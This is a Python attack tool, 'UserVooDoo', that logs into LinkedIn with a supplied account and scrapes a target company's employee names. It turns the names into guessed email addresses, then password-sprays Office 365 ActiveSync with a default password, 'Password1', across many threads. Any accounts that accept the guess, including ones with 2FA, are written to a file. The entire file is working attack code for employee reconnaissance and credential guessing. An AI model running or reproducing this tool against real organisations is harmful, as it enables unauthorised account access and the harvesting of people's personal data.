from __future__ import division
from http.cookiejar import CookieJar
from urllib.request import Request, build_opener, HTTPCookieProcessor, HTTPHandler, HTTPSHandler, urlopen
from urllib.parse import urlencode

import time
import json
import math
import ssl
import argparse
import re
import sys
import os
import codecs
import hashlib
import hmac
import base64
import urllib
import requests
from argparse import RawTextHelpFormatter
import threading
import pyfiglet

prebanner = pyfiglet.figlet_format("UserVooDoo")
banner = prebanner + "\t Written by Waffles (@Waffl3sss)\n"
print(banner)

# Parse user arguments
parser = argparse.ArgumentParser(description='Company Linkedin user enumeration and cleanup. Includes functionality for OWA password spraying.', formatter_class=RawTextHelpFormatter)
parser.add_argument('-c', dest='company', default='', required=True, help="Company to search for")
parser.add_argument('-id', dest='companyid', required=False, help="Company ID to search for")
parser.add_argument('-s', dest='sleep', default=5, required=False, help="Time to sleep between requests")
parser.add_argument('-mr', dest='max_requests_per_title', default=500, required=True, help="Max number of requests per for querying LinkedIn (Default 500)")
parser.add_argument('-ua', dest='user_agent', required=False, default='Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3', help="User-Agent for Requests")
parser.add_argument('-user', dest='linkedin_username', required=True, default='', help="LinkedIn.com Authenticated Username")
parser.add_argument('-pass', dest='linkedin_password', required=True, default='', help="LinkedIn.com Authenticated Password")
parser.add_argument('-t', dest='timeout', required=False, default=1, help="HTTP Request timeout")
parser.add_argument('-disable-ssl', dest='ssl_validation', required=False, default=True, help="Disable SSL Validation Checks", action='store_false')
parser.add_argument('-o', dest='outputfile', required=False, default='', help="Write output to file")
parser.add_argument('-d', dest='domain', default='', required=False, help="Domain to add as email")
parser.add_argument('-m', dest='manglemode', choices=['1','2','3'], default=1, required=False, help="Mode to mangle: \n 1 = First.Last (default) \n 2 = F.Last \n 3 = First.L")
parser.add_argument('-owa', dest='testowa', default=False, required=False, help="Use output file to test against easily guessable credentials. (requires -d and -owapass", action='store_true')
parser.add_argument('-owapass', dest='owapass', default='Password1', required=False, help="Password to use against OWA login")
parser.add_argument('-owathreads', dest='owathreads', default=25, required=False, help="Number of threads to run during OWA password guessing")
parser.set_defaults(ssl_validation=True)
args = parser.parse_args()

# Assign user arguments to variables we can use
company = str(args.company) # String
companyid = args.companyid # Int
sleep = int(args.sleep) # Int
max_requests_per_title = int(args.max_requests_per_title) # Int
user_agent = str(args.user_agent) # String
linkedin_username = str(args.linkedin_username) # String
linkedin_password = str(args.linkedin_password) # String
timeout = int(args.timeout) # Int
ssl_validation = str(args.ssl_validation) # Bool
domain = str(args.domain) # String
outputfile = str(args.outputfile) # String
manglemode = int(args.manglemode) # Int
testowa = str(args.testowa) # Bool
owapass = str(args.owapass) # String
owathreads = int(args.owathreads) # Int

# Other variables to be used
owaurl = "https://outlook.office365.com/Microsoft-Server-ActiveSync"
owatimeout = 30

outputfiletemp = outputfile + '_temp'
owa_outputfile = ''

# Colors for terminal output because Waffles likes pretty things
class bcolors:
	OKGREEN = '\033[92m'
	BOLD = '\033[1m'
	NONERED = '\033[91m'
	ENDLINE = '\033[0m'
	UNDERLINE = '\033[4m'

# argparse is broken and stores booleans as strings, this will fix (old method, dont know if this has been updateded/fixed)
if ssl_validation == 'True':
	ssl_validation = True
else:
	ssl_validation = False
if testowa == 'True':
	testowa = True
else:
	testowa = False

# Remove @ from domain option if user included it
if domain.startswith("@"):
	domain = domain.split("@")[1]
else:
	domain = domain

# If outputfile is not selected, OWA testing cannot happen
if args.testowa and args.outputfile == '':
	parser.error("OWA testing requires outputfile (-o).")

# If output file is selected, display output file name
if outputfile != '':
	print(bcolors.OKGREEN + '[+] Output File name: ' + outputfile + bcolors.ENDLINE)

# Check if output files exist, prompt to delete if they do. Need to move this to the main function so if you choose to not overwrite the file, it just uses the old file 
if os.path.exists(outputfile):
		del_outputfile = input('Output File exists, do you want to overwrite it? [Y/n]')
		if del_outputfile == 'y' or 'Y' or '':
			os.remove(outputfile)
		elif del_outputfile == 'n' or 'N':
			print('Stoping script')
			sys.exit()
		else:
			print('Not a valid option, please try again.....')
			main_generator()

def sslvalidation():
	ctx = ssl.create_default_context()
	ctx.check_hostname = False
	ctx.verify_mode = ssl.CERT_NONE
	return ctx

def getcookie(cookiejar):
	c = ""
	for cookie in cookiejar:
		c += cookie.name + "=" + cookie.value + "; "
	return c

def logincsrf(cookiejar):
	for cookie in cookiejar:
		if cookie.name == "bcookie":
			return cookie.value.split('&')[1][:-1]

def ajaxtoken(cookiejar):
	for cookie in cookiejar:
		if cookie.name == "JSESSIONID":
			return cookie.value[1:-1]

def initialReq():
	cookiejar = CookieJar()
	if ('ssl_validation'):
		opener = build_opener(HTTPCookieProcessor(cookiejar), HTTPHandler())
	else:
		opener = build_opener(HTTPCookieProcessor(cookiejar), HTTPHandler(), HTTPSHandler(context=sslvalidation()))

	headers = {
		"Host": "www.linkedin.com",
		"Agent": user_agent,
		}

	req = Request("https://www.linkedin.com")
	f = opener.open(req, timeout=timeout)
	return cookiejar

def authReq(cookiejar):
	if (ssl_validation):
		opener = build_opener(HTTPCookieProcessor(cookiejar), HTTPHandler())
	else:
		opener = build_opener(HTTPCookieProcessor(cookiejar), HTTPHandler(), HTTPSHandler(context=sslvalidation()))
	lcsrf = logincsrf(cookiejar)
	if (lcsrf is None):
		print(bcolors.NONERED + '[-] Failed to pull CSRF token' + bcolors.ENDLINE)

	data = urlencode({"session_key": linkedin_username, "session_password": linkedin_password, "isJsEnabled": "false", "loginCsrfParam": lcsrf}).encode("utf-8")
	headers = {
		"Host": "www.linkedin.com",
		"User-Agent": user_agent,
		"Content-type": "application/x-www-form-urlencoded",
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Cookie": getcookie(cookiejar),
		"X-IsAJAXForm": "1",
		}

	req = Request("https://www.linkedin.com/uas/login-submit", headers)
	f = opener.open(req, timeout=timeout, data=data)
	return cookiejar

def pullid():
	global company
	global companyid
	cookiejar = initialReq()
	cookiejar = authReq(cookiejar)

	if (ssl_validation):
		opener = build_opener(HTTPCookieProcessor(cookiejar), HTTPHandler())
	else:
		opener = build_opener(HTTPCookieProcessor(cookiejar), HTTPHandler(), HTTPSHandler(context=sslvalidation()))
	query = "count=10&filters=List(resultType-%3ECOMPANIES)&" + urlencode({"keywords": company})  + "&origin=SWITCH_SEARCH_VERTICAL&q=all&queryContext=List(spellCorrectionEnabled-%3Etrue,relatedSearchesEnabled-%3Efalse)&start=0"
	headers = {
		"Host": "www.linkedin.com",
		"User-Agent": user_agent,
		"Accept": "application/vnd.linkedin.normalized+json+2.1",
		"x-restli-protocol-version": "2.0.0",
		"Cookie": getcookie(cookiejar),
		"Csrf-Token": ajaxtoken(cookiejar),
		}

	req = Request("https://www.linkedin.com/voyager/api/search/blended?" + query, None, headers)
	data = opener.open(req, timeout=timeout).read()
	content = json.loads(data)
	for companyname in content["included"]:
		id = companyname["entityUrn"].split(":")
		print("{:.<40}: {:s}".format(companyname["name"] + " :",id[3]))
	companyid = input("\nSelect company ID value: ")

def recon(title, cookiejar, count, start):
	if (ssl_validation):
		opener = build_opener(HTTPCookieProcessor(cookiejar), HTTPHandler())
	else:
		opener = build_opener(HTTPCookieProcessor(cookiejar), HTTPHandler(), HTTPSHandler(context=sslvalidation()))

	if (title is None):
		query = "count=" + str(count) + "&filters=List(currentCompany-%3E" + str(companyid) + ",resultType-%3EPEOPLE" + ")&origin=FACETED_SEARCH&q=all&queryContext=List(spellCorrectionEnabled-%3" + "Etrue,relatedSearchesEnabled-%3Etrue,kcardTypes-%3ECOMPANY%7CJOB_TITLE)&start=" + str(start)
	else:
		query = "count=" + str(count) + "&filters=List(currentCompany-%3E" + str(companyid) + ",resultType-%3EPEOPLE,title-%3E" + urlencode({str(title):None}).split("=")[0] + ")&origin=FACETED_SEARCH&q=all&queryContext=List(spellCorrectionEnabled-%3" + "Etrue,relatedSearchesEnabled-%3Etrue,kcardTypes-%3ECOMPANY%7CJOB_TITLE)&start=" + str(start)

	headers = {
		"Host": "www.linkedin.com",
		"User-Agent": user_agent,
		"Accept": "application/vnd.linkedin.normalized+json+2.1",
		"x-restli-protocol-version": "2.0.0",
		"Cookie": getcookie(cookiejar),
		"Csrf-Token": ajaxtoken(cookiejar),
		}
	req = Request("https://www.linkedin.com/voyager/api/search/blended?" + query, None, headers)
	f = opener.open(req, timeout=timeout)
	return f.read()

def owa():
	global domain
	global owa_outputfile
	global owapass
	global owatimeout
	global owathreads

	print(bcolors.OKGREEN + '[+] Running OWA module' + bcolors.ENDLINE)

	threadlist = []

	owa_outputfile = "OWA_Valid_Creds_" + str(domain) + ".txt"
	owaheader = {"MS-ASProtocolVersion": "14.0"}

	if os.path.exists(owa_outputfile):
		del_owa_file = input('OWA Testing output file exist, do you want to overwrite it? [Y/n]')
		if del_owa_file == 'y' or 'Y' or '':
			os.remove(owa_outputfile)
		elif del_owa_file == 'n' or 'N':
			print('Stopping Script')
			sys.exit()
		else:
			print('Not a valid option, please try again.....')
			owa()

	def owathreadfunction(owauser, owaauth):
		try:
			owarequest = requests.options(owaurl, headers=owaheader, auth=owaauth, timeout=owatimeout)
		except Exception as e:
			print(bcolors.NONERED + '[-] OWA Error, Continuing....' + bcolors.ENDLINE)
			pass
		owastatus = owarequest.status_code

		if owastatus == 200:
			print(bcolors.OKGREEN + '[+] Valid Credentials: ' + owauser + ":" + owapass + bcolors.ENDLINE)
			print(bcolors.OKGREEN + '[+] Valid Credentials: ' + owauser + ":" + owapass + bcolors.ENDLINE, file = owaoutfile)
		elif owastatus == 403:
			print(bcolors.OKGREEN + '[+] Valid Creds with 2FA: ' + owauser + ":" + owapass + bcolors.ENDLINE)
			print(bcolors.OKGREEN + '[+] Valid Creds with 2FA: ' + owauser + ":" + owapass + bcolors.ENDLINE, file = owaoutfile)
		else:
			# Uncomment the below line to show invalid creds. This was used for debugging
			#print(bcolors.NONERED + '[-] Invalid creds for: ' + owauser + ":" + owapass + bcolors.ENDLINE)
			pass

	with open(outputfile,'r') as owainfile:
		for line in owainfile:
			owauser = line.strip()
			owaauth = (owauser, owapass)
			owaoutfile = open(owa_outputfile, "a+")
			t = threading.Thread(target=owathreadfunction, args=(owauser, owaauth,))
			threadlist.append(t)

	for thread in threadlist:
		thread.start()
		if threading.active_count() == owathreads:
			thread.join()

#Main Function
def main_generator():
	if (companyid == '' or companyid is None):
		print("Pulling Company ID for {:s}\n".format(company))
		pullid()

	cj = initialReq()
	cj = authReq(cj)

	print('Searching all contacts')
	count = 0
	total_found = 0
	title_found = 0
	data = recon(None, cj, 1, 0)
	content = json.loads(data)

	# Pull count of identified users
	count = content["data"]["metadata"]["totalResultCount"]
	print(bcolors.OKGREEN + '[+] Found {} users'.format(count) + bcolors.ENDLINE)
	print('Spreading Requests Across {} Connections'.format(int(math.ceil(count/50))))
	for i in range(1, int(math.ceil(count/50))+1):
		if i == 1:
			print(bcolors.OKGREEN + '[+] Request {} of {}'.format(i, count) + bcolors.ENDLINE)
			data = recon(None, cj, 49, 0)
		# Even though this is less accurate for user counting, we might as well add as many as we got for the requests.
		elif (max_requests_per_title != 0 and title_found >= max_requests_per_title):
			print(bcolors.OKGREEN + '[+] Found {} contacts, moving on.'.format(title_found) + bcolors.ENDLINE)
			title_found = 0
			break
		else:
			print(bcolors.OKGREEN + '[+] Request {} of {}'.format(i*50, count) + bcolors.ENDLINE)
			data = recon(None, cj, 49, i*50)
		content = json.loads(data)
		
		# Part where the names are created and/or mangled
		for user in content["included"]:
			if "firstName" in user:
				if manglemode == 1:
					first_name = re.sub(r'\W+', ' ', user.get("firstName")).split(" ")[0]
					last_name = re.sub(r'\W+', ' ', user.get("lastName")).split(" ")[0]
				elif manglemode == 2:
					first_name = re.sub(r'\W+', ' ', user.get("firstName")).split(" ")[0][:1]
					last_name = re.sub(r'\W+', ' ', user.get("lastName")).split(" ")[0]
				elif manglemode == 3:
					first_name = re.sub(r'\W+', ' ', user.get("firstName")).split(" ")[0]
					last_name = re.sub(r'\W+', ' ', user.get("lastName")).split(" ")[0][:1]
				else:
					first_name = re.sub(r'\W+', ' ', user.get("firstName")).split(" ")[0]
					last_name = re.sub(r'\W+', ' ', user.get("lastName")).split(" ")[0]
				full_name = (first_name + "." + last_name)
				if full_name.startswith("."):
					pass
				elif domain != '':
					email_addr = full_name + "@" + domain
					if outputfile != '':
						# Print to file
						file = open(outputfiletemp,"a+")
						print(email_addr, file = file)
					else:
						print(email_addr)
					total_found += 1
					title_found += 1
				else:
					print(full_name)
					total_found += 1
					title_found += 1
		if outputfile != '':
			file.close()
		time.sleep(sleep)

	# Remove Duplicates from outputfile
	lines_seen = set()
	dedupefile = open(outputfile, "a+")
	for line in open(outputfiletemp, "r"):
		if line not in lines_seen:
			lines_seen.add(line)
	dedupefile.writelines(sorted(lines_seen))
	dedupefile.close()
	if os.path.exists(outputfiletemp):
		os.remove(outputfiletemp)

	if testowa == True:
		owa()

main_generator()
# I miss Python2.7
